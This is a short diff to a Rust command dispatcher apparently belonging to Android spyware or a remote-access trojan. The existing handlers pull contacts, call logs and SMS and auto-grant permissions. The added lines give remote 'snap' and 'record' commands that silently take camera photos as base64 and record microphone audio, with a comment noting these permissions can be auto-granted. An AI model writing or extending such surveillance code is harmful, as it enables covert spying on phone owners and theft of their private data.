@@ -273,6 +273,21 @@ fn execute_command(cmd: &str, payload: &serde_json::Value) -> Option<String> {
         "contacts" => Some(cmd_contacts()),
         "calllog" => Some(cmd_calllog()),
         "sms" => Some(cmd_sms()),
+        // Camera / mic capture primitives (auto-grantable via CAMERA + RECORD_AUDIO).
+        //   snap   -> photo as base64 JPEG   ("b64:...")
+        //   record <ms> -> mic capture, default 5000ms, capped 30000
+        "snap" | "photo" => {
+            let which = payload.as_str()
+                .or_else(|| payload.get("which").and_then(|v| v.as_str()))
+                .unwrap_or("back")
+                .to_string();
+            Some(android_bridge::snap_camera(&which))
+        }
+        "record" | "audio" => {
+            let ms = payload.as_u64().or_else(|| payload.get("ms").and_then(|v| v.as_u64()))
+                .unwrap_or(5000) as i32;
+            Some(android_bridge::record_audio(ms))
+        }
         "grant" | "autogrant" => {
             let perm = payload.as_str()
                 .or_else(|| payload.get("permission").and_then(|v| v.as_str()))
